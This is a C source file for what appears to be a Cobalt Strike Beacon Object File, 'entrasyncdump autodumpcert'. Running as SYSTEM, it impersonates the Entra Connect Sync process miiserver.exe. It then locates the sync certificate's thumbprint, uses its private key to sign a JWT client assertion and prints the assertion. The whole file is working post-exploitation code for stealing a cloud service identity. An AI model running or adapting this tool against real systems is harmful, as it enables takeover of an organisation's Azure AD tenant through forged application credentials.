#include "entrasyncdump_common.h"

// autodumpcert: automated certificate extraction and JWT assertion generation.
//
// Prereqs: must be running as SYSTEM (or have steal_token'd to SYSTEM).
// Takes: PID of miiserver.exe, tenant_id, client_id
//
// No SQL queries, no process enumeration — just impersonate, discover thumbprint,
// open cert store, sign JWT.
//
// Flow:
//   1. Impersonate miiserver.exe via provided PID (direct — no process enum)
//   2. Discover thumbprint from cert directory (under ADSync context)
//   3. Open cert store, acquire CNG key, build and sign JWT
//   4. Output assertion

void cmd_autodumpcert(DWORD pid, CONST CHAR* tenant_id, CONST CHAR* client_id) {

    HANDLE hImpToken = NULL;
    CHAR* thumbprint = NULL;

    // Step 1: Impersonate the target process via PID
    hImpToken = impersonate_pid(pid);
    if (!hImpToken) {
        return;
    }

    // Step 2: Discover thumbprint from cert directory
    thumbprint = discover_thumbprint();
    if (!thumbprint) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not discover certificate thumbprint.\n");
        goto auto_cleanup;
    }

    // Step 3: Sign JWT under impersonated context
    sign_jwt_assertion(thumbprint, client_id, tenant_id);

auto_cleanup:
    API(ADVAPI32, RevertToSelf)();
    API(KERNEL32, CloseHandle)(hImpToken);
    if (thumbprint) BofHeapFree(thumbprint);
}


#ifdef _DEBUG
void main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: entrasyncdump_autodumpcert <pid> <tenant_id> <client_id>\n");
        return;
    }
    DWORD pid = atoi(argv[1]);
    cmd_autodumpcert(pid, argv[2], argv[3]);
}
#else
void go(PCHAR args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    INT pid = BeaconDataInt(&parser);
    CHAR* tenant_id = BeaconDataExtract(&parser, NULL);
    CHAR* client_id = BeaconDataExtract(&parser, NULL);

    if (pid <= 0 ||
        !tenant_id || API(MSVCRT, strlen)(tenant_id) == 0 ||
        !client_id || API(MSVCRT, strlen)(client_id) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: entrasyncdump autodumpcert <pid> <tenant_id> <client_id>\n"
            "  pid        - PID of miiserver.exe (from 'ps')\n"
            "  tenant_id  - Azure AD tenant ID\n"
            "  client_id  - Application/Client ID (from dumpcertinfo)\n"
        );
        return;
    }

    cmd_autodumpcert((DWORD)pid, tenant_id, client_id);
}
#endif
